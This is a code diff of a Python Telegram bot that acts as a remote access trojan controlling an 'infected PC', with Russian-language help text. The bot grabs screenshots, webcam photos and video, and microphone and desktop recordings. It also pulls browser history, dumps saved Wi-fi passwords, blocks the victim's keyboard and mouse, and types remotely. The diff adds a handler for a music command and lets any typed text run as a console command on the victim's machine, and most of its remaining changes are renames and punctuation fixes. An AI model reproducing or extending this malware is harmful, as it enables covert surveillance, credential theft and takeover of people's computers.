@@ -48,38 +48,45 @@ async def command_start(message=types.Message):
         button_lmb, button_block, button_unblock, button_turnoffscreen, button_turnonscreen, button_help)
 
     await bot.send_message(message.from_user.id,
-                           '/help - список команд'
+                           'Вы можете просто писать консольные команды, например dir или cd, и она выполнится.\n'
+                           '/help - список команд.\n'
                            '/download "имя файла" - скачать файл из директории, в которовый вы находитесь.\n'
-                           '/openurl "ссылка" - открыть ссылку\n'
-                           '/v "число от 0 до 100" - устанвоить громкость ПК\n'
-                           '/s "текст" - озвучить текст\n'
-                           '/. "команда" - выполнить консольную команду, которую вы вписали\n'
-                           '/change + загрузить фото - загруженное фото станет обоими рабочего столка зараженного ПК\n'
-                           '/audmic "время в секундах" - запись звука с микрофона на протяжении указанного времени\n'
-                           '/webvid "время в секундах" - запись видео с веб-камеры на протяжении указанного времени\n'
-                           '/deskvid "время в секундах" - запись видео с рабочего стола на протяжении указанного времени\n'
-                           '/history "дата в формате "ГГГГ-ММ-ДД" - история с веб-браузеров в указанную дату\n'
-                           '/hinder ,"время в секундах","сообщение" - на зараженном ПК в течение указанного времени будет воспроизводиться указанный текст\n'
+                           '/openurl "ссылка" - открыть ссылку.\n'
+                           '/v "число от 0 до 100" - установить громкость ПК.\n'
+                           '/s "текст" - озвучить текст.\n'
+                           '/change + загрузить фото - загруженное фото станет обоими рабочего столка зараженного ПК.\n'
+                           '/audmic "время в секундах" - запись звука с микрофона на протяжении указанного времени.\n'
+                           '/webvid "время в секундах" - запись видео с веб-камеры на протяжении указанного времени.\n'
+                           '/deskvid "время в секундах" - запись видео с рабочего стола на протяжении указанного времени.\n'
+                           '/history "дата в формате "ГГГГ-ММ-ДД" - история с веб-браузеров в указанную дату.\n'
+                           '/hinder ,"время в секундах","сообщение" - на зараженном ПК в течение указанного времени будет воспроизводиться указанный текст.\n'
                            '\n'
+                           '~ cd - узнать директорию, в которой вы находитесь.'
                            '~ Скриншот - получить скриншот.\n'
                            '~ Фото с веб-камеры - получить изображение вебкамеры.\n'
-                           '~ Музыка - включить музыку\n'
-                           '~ Wi-fi - Получить названия сетей и пароли от них\n'
+                           '~ Музыка - включить музыку.\n'
+                           '~ Wi-fi - Получить названия сетей и пароли от них.\n'
                            '~ Мем - открыть мем с:\n'
-                           '~ ЛКМ - нажатие левой клавишой мыши\n'
-                           '~ Блок ввода - запрещает юзеру ПК пользоваться устройствами ввода\n'
-                           '~ Анблок ввода - отменяет команду "Блок ввода"\n'
-                           '~ Выключить экран - Выключить экран\n'
-                           '~ Включить экран - Включить экран\n'
+                           '~ ЛКМ - нажатие левой клавишой мыши.\n'
+                           '~ Блок ввода - запрещает юзеру ПК пользоваться устройствами ввода.\n'
+                           '~ Анблок ввода - отменяет команду "Блок ввода".\n'
+                           '~ Выключить экран - Выключить экран.\n'
+                           '~ Включить экран - Включить экран.\n'
                            ,
                            reply_markup=commands_kb)
 
 
-@dp.message_handler(commands=['history'])
+@dp.message_handler(text=['Музыка'])
 async def get_history(msg: types.Message):
-    commands = msg.text.split()
+    rm.play_music()
+    await bot.send_message(msg.from_user.id, "Музыка включена")
+
+
+@dp.message_handler(commands=['history'])
+async def get_history(message: types.Message):
+    commands = message.text.split()
     date = commands[1] if len(commands) > 1 else str(datetime.date.today())
-    await send_message(bot, msg.from_user.id, rm.get_history(date))
+    await send_message(bot, message.from_user.id, rm.get_history(date))
 
 
 @dp.message_handler(commands=['download'])
@@ -100,23 +107,23 @@ async def exe(message: types.Message):
 
 
 @dp.message_handler(text=['Скриншот'])
-async def send_screenshot(msg: types.Message):
+async def send_screenshot(message: types.Message):
     image = pyscreenshot.grab()
     image.save("screen.png")
 
-    await bot.send_photo(msg.from_user.id, types.InputFile('screen.png'))
+    await bot.send_photo(message.from_user.id, types.InputFile('screen.png'))
 
     os.remove("screen.png")
 
 
 @dp.message_handler(text=['Фото с веб-камеры'])
-async def send_cam(msg: types.Message):
+async def send_cam(message: types.Message):
     isCamExist = rm.make_cam_photo()
 
     if isCamExist:
-        await bot.send_photo(msg.from_user.id, types.InputFile('screen_camera.png'))
+        await bot.send_photo(message.from_user.id, types.InputFile('screen_camera.png'))
     else:
-        await bot.send_message(msg.from_user.id, "Ошибка! Веб-камера выключена, либо она отсутствует.")
+        await bot.send_message(message.from_user.id, "Ошибка! Веб-камера выключена, либо она отсутствует.")
 
     os.remove("screen_camera.png")
 
@@ -135,7 +142,7 @@ async def video_from_webcam(message: types.Message):
 
 
 @dp.message_handler(commands=['deskvid'])
-async def video_from_webcam(message: types.Message):
+async def video_from_desktop(message: types.Message):
     duration = int(message.text.split()[1])
     video_bytes = rm.make_desktop_video(duration)
     await bot.send_video(message.from_user.id, video=video_bytes)
@@ -155,35 +162,35 @@ async def audio_from_micro(message: types.Message):
 
 
 @dp.message_handler(text=['Мем'])
-async def open_mem(msg: types.Message):
+async def open_mem(message: types.Message):
     rm.open_url()
     sleep(3)
     Sound.volume_max()
 
 
 @dp.message_handler(commands=['openurl'])
-async def open_url(msg: types.Message):
-    rm.open_url(msg.text.split()[1])
+async def open_url(message: types.Message):
+    rm.open_url(message.text.split()[1])
 
 
 @dp.message_handler(commands='s')
-async def say_text(msg: types.Message):
-    await rm.say_text(msg.text[2:])
+async def say_text(message: types.Message):
+    await rm.say_text(message.text[2:])
 
 
 @dp.message_handler(text='ЛКМ')
-async def mouse_left_click(msg: types.Message):
+async def mouse_left_click(message: types.Message):
     pyautogui.click()
 
 
 @dp.message_handler(text='Блок ввода')
-async def block_input(msg: types.Message):
-    await msg.answer(rm.blockinput())
+async def block_input(message: types.Message):
+    await message.answer(rm.block_input())
 
 
 @dp.message_handler(text='Анблок ввода')
-async def unblock_input(msg: types.Message):
-    await msg.answer(rm.blockinput_stop())
+async def unblock_input(message: types.Message):
+    await message.answer(rm.block_input_stop())
 
 
 @dp.message_handler(text='Выключить экран')
@@ -197,17 +204,17 @@ async def turnon_screen(message: types.Message):
 
 
 @dp.message_handler(commands='v')
-async def set_volume(msg: types.Message):
+async def set_volume(message: types.Message):
     try:
-        Sound.volume_set(int(msg.text.split()[1]))
-        await rm.say_text(f'Громкость звука установлена на {msg.text.split()[1]}%')
+        Sound.volume_set(int(message.text.split()[1]))
+        # await rm.say_text(f'Громкость звука установлена на {message.text.split()[1]}%')
     except Exception:
-        await msg.answer('Введите комманду в формате "/v x", где x - число от 0 до 100')
+        await message.answer('Введите комманду в формате "/v x", где x - число от 0 до 100')
 
 
 @dp.message_handler(content_types=[ContentType.VOICE])
-async def voice_say(msg: types.Message):
-    voice = msg.voice
+async def voice_say(message: types.Message):
+    voice = message.voice
     await voice.download()
 
     await voice.download(destination_file=r'voice/voice.wav')
@@ -222,22 +229,22 @@ async def voice_say(msg: types.Message):
 
 @dp.message_handler(commands=["change"], commands_prefix="/", commands_ignore_caption=False,
                     content_types=["photo"])
-async def change_desktop_wallpapers(msg: types.Message):
-    await msg.photo[-1].download('C:/img/img.jpg')
+async def change_desktop_wallpapers(message: types.Message):
+    await message.photo[-1].download('C:/img/img.jpg')
     rm.change_background(r'C:/img/img.jpg')
 
 
 @dp.message_handler(text=["Wi-fi"])
-async def get_passwords(msg: types.Message):
-    await send_message(bot, msg.from_user.id, rm.get_passwords())
+async def get_passwords(message: types.Message):
+    await send_message(bot, message.from_user.id, rm.get_passwords())
 
 
 @dp.message_handler(commands=["hinder"])
-async def get_keyboard_history(message: types.Message):
+async def typing_keyboard_remotely(message: types.Message):
     msg = message.text.split(",")
     duration = int(msg[1])
     text_of_message = str(msg[2])
-    rm.check_keyboard_inputes(duration, text_of_message)
+    rm.typing_keyboard_remotely(duration, text_of_message)
 
 
 @dp.message_handler()
